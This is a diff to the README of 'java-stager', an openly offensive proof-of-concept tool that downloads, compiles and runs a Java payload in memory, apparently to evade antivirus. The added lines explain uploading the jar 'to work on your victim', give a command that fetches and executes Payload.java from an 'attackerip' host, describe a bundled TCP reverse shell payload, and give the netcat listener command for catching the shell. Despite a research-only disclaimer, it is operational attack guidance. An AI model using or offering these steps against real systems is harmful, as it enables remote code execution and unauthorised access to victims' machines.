@@ -1,6 +1,8 @@
 # java-stager
 A PoC Java Stager which can download, compile, and execute a Java file in memory.
 
+This is for research purposes only, do not use this where you are unauthorised to do so.
+
 # What is this?
 
 This is based on the work of James Williams from his talk "Next Gen AV vs My Shitty Code" available here:
@@ -27,19 +29,36 @@ The output in NetBeans Included a line like this:
 
 `Building jar: C:\Users\cornerpirate\Documents\NetBeansProjects\java-stager\target\JavaStager-0.1-initial.jar`
 
-Assuming you have generated the same Jar file the stager will run if you execute this in the "java-stager" folder:
+To work on your victim you must upload the "JavaStager*.jar" file and the "lib" folder containing Janino from the "target" folder.
 
-`java -cp target/JavaStager-0.1-initial.jar Stager`
+The following command will execute the stager:
 
-As I was just doing a PoC I have not figured out how to make Maven do all the nice things to make this a simpler Jar to execute. But who knows you can probably run with the ball here. To test I uploaded the full "java-stager" folder to a VM (playing the victim) which isn't that mobile but was sufficient.
+`java -jar JavaStager-0.1-initial.jar`
 
-The above will call the "Stager" class which has a main method. You will be prompted with the usage as shown:
+You will be prompted with the usage as shown:
 
 `Proper Usage is: java Stager <url>`
 
-The "url" is the only parameter that is passed to Stager. 
+The "url" is the only parameter that is passed to Stager. An example usage would be:
 
-Configure your "payload.java" file to service your needs. In my PoC the Stager will invoke the "revshell" method in the "payload" object. Before looking to exploit a system you will want to check that your payload compiles cleanly or it will fail on the victim. When you are happy you can host the ".java" file (uncompiled) on a web server. I have a blog post covering basic HTTP/HTTPS servers with python 2 and 3 available here:
+`java -jar JavaStager-0.1-initial.jar http://attackerip/Payload.java`
+
+Your payload must be in a file called "Payload.java" and your exploit code must be in a static method called "Run". The following shows the template if you want to write your own:
+
+`
+public class Payload {
+   public static void Run() {
+      // Your code here
+   }
+}
+`
+
+I have provided an example Reverse TCP payload in the file "TCPReverseShell.java". To prevent name clashes this is not called "Payload.java" and the class name is wrong. 
+The header comment in "TCPReverseShell.java" explains how to modify it to work.
+
+You will need to host your "Payload.java" file on an HTTP server. You can use Apache if you want or simple HTTP/HTTPS services in Python2 and Python3 as per my blog:
 
 https://cornerpirate.com/2016/12/16/simple-http-or-https-servers/
+
+The attacker will need to start a netcat listener to catch the connection back using the standard `nc -lvp 8044` technique.
 
